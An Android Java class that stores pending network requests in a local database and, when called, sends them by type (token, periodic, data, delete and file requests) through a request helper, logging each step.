package com.inet.android.db;

import java.io.File;
import java.util.List;

import android.content.Context;

import com.inet.android.list.TurnSendList;
import com.inet.android.request.ConstantValue;
import com.inet.android.request.DisassemblyParams;
import com.inet.android.request.RequestList;
import com.inet.android.utils.Logging;

public class OperationWithRecordInDataBase {

	private static String LOG_TAG = OperationWithRecordInDataBase.class
			.getSimpleName().toString();

	public static void insertRecord(String request, int type, Context mContext) {

		RequestDataBaseHelper db = new RequestDataBaseHelper(mContext);
		if (db.getExistType(type) == false || type == 4 || type == 6) {
			Logging.doLog(LOG_TAG,
					"add request: " + request + " type: " + type, "request: "
							+ request + " type: " + type);
			db.addRequest(new RequestWithDataBase(request, type));
		}
	}

	public static void insertRecord(String request, int type, int typeList,
			String complete, int version, Context mContext) {

		RequestDataBaseHelper db = new RequestDataBaseHelper(mContext);
		if (db.getExistType(type) == false || type == 4 || type == 6) {
			Logging.doLog(LOG_TAG, "add request: " + request + " type: " + type
					+ " typeList: " + typeList + " complete: " + complete
					+ " version: " + version, "request: " + request + " type: "
					+ type + " typeList: " + typeList + " complete: "
					+ complete + " version: " + version);
			db.addRequest(new RequestWithDataBase(request, type, typeList,
					complete, version));
		}
	}

	public static void sendRecord(Context mContext) {
		StringBuilder typeDataStrings = new StringBuilder();
		RequestDataBaseHelper db;
		Logging.doLog(LOG_TAG, typeDataStrings.toString(),
				typeDataStrings.toString());
		Logging.doLog(LOG_TAG, "NetWorkChange - begin", "NetWorkChange - begin");
		File database = mContext.getDatabasePath("request_database.db");

		if (!database.exists() || database.length() == 0) {
			// Database does not exist so copy it from assets here
			Logging.doLog(LOG_TAG, "DataBase Not Found", "DataBase Not Found");
			return;
		} else {
			db = new RequestDataBaseHelper(mContext);
			Logging.doLog(LOG_TAG, "Found");
		}
		List<RequestWithDataBase> listReq = db.getAllRequest();
		for (RequestWithDataBase req : listReq) {
			if (req.getType() != -1) {
				switch (req.getType()) {
				// ------------------------take token 1---------------------
				case ConstantValue.TYPE_FIRST_TOKEN_REQUEST:
					Logging.doLog(LOG_TAG, "send token 1", "send token 1");
					RequestList.sendRequestForFirstToken(mContext);
					db.delete_byID(req.getID());
					break;
				// ------------------------take token 2---------------------
				case ConstantValue.TYPE_SECOND_TOKEN_REQUEST:
					Logging.doLog(LOG_TAG, "send token 2", "send token 2");
					RequestList.sendRequestForSecondToken(mContext);
					db.delete_byID(req.getID());
					// ------------------------send periodical request----------
				case ConstantValue.TYPE_PERIODIC_REQUEST:
					Logging.doLog(
							LOG_TAG,
							"NetworkChangeReceiver send periodical request type =3",
							"NetworkChangeReceiver send periodical pequest type =3");
					RequestList.sendPeriodicRequest(mContext);
					db.delete_byID(req.getID());
					break;
				// ------------------------send data request----------

				case ConstantValue.TYPE_DATA_REQUEST:
					if (!typeDataStrings.toString().equals(" "))
						typeDataStrings.append(",");
					{

						Logging.doLog(LOG_TAG,
								"NetworkChangeReceiver send data request type = 4 "
										+ typeDataStrings.toString(),
								"NetworkChangeReceiver send data request type = 4 "
										+ typeDataStrings.toString());
						typeDataStrings.append(req.getRequest());
						db.deleteRequest(new RequestWithDataBase(req.getID()));
					}
					break;
				// ------------------send del request------------------
				case ConstantValue.TYPE_DEL_REQUEST:
					Logging.doLog(LOG_TAG,
							"NetworkChangeReceiver send del request type = 5",
							"NetworkChangeReceiver send del request type = 5");

					RequestList.sendDelRequest(mContext);
					db.delete_byID(req.getID());
					break;
				// ------------------send file request------------------

				case ConstantValue.TYPE_FILE_REQUEST:
					Logging.doLog(LOG_TAG,
							"NetworkChangeReceiver send file request type = 6"
									+ " request: " + req.getRequest(),
							"NetworkChangeReceiver send file request type = 6"
									+ " request: " + req.getRequest());

					RequestList.sendFileRequest(
							DisassemblyParams.parsingString(req.getRequest()),
							mContext);
					db.delete_byID(req.getID());
					break;
				default:
					break;
				}

			} else {
				db.deleteRequest(new RequestWithDataBase(req.getID()));
			}
		}
		if (typeDataStrings.length() > 5) {
			Logging.doLog(LOG_TAG,
					"before send: " + typeDataStrings.toString(),
					"before send: " + typeDataStrings.toString());
			RequestList.sendDataRequest(typeDataStrings.toString(), mContext);
		}
		TurnSendList.startGetList(mContext);
	}
}